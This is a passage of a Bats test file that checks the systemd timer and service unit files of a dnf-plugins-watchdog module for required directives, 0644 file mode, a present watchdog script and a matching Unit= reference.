    timer_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^Description=' "${t}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog timer unit file mode is 0644 — systemd unit-file mode convention)" {
    # Sister to brain-wide systemd unit-file mode INVARIANT
    # family. systemd unit files MUST be chmod 0644 (world-
    # readable + root-write-only). Locks the timer unit-file
    # mode discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        m=$(stat -c '%a' "${t}")
        [ "${m}" = "644" ]
    done
}

@test "INVARIANT (dnf-plugins-watchdog timer unit declares Persistent= directive — boot-catchup-policy contract)" {
    # Sister to brain-wide systemd timer Persistent= INVARIANT
    # family.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^Persistent=' "${t}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog .sh script file exists in module systemd/ dir — ExecStart-target source-of-truth contract)" {
    # Sister to brain-wide ExecStart-target INVARIANT family.
    # The watchdog .service's ExecStart points at
    # /usr/local/libexec/selfdef/<slug>-watchdog.sh which is
    # the runtime install path; the source of truth lives at
    # modules/<slug>-watchdog/systemd/<slug>-watchdog.sh.
    # A regression that lost the script file would break
    # the cargo-deb manifest install + leave ExecStart
    # dangling. Locks the source-script-exists discipline
    # on the dnf-plugins-watchdog substrate.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    [ -f "${script_dir}/dnf-plugins-watchdog.sh" ] ||     [ -n "$(ls "${script_dir}"/*.sh 2>/dev/null)" ]
}

@test "INVARIANT (dnf-plugins-watchdog timer's Unit= field references a .service in the same module dir — co-located unit-pair binding contract)" {
    # Sister to brain-wide timer Unit= INVARIANT family.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        unit=$(grep -E '^Unit=' "${t}" | head -1 | cut -d= -f2)
        [ -n "${unit}" ]
        [ -f "${timer_dir}/${unit}" ]
    done
}
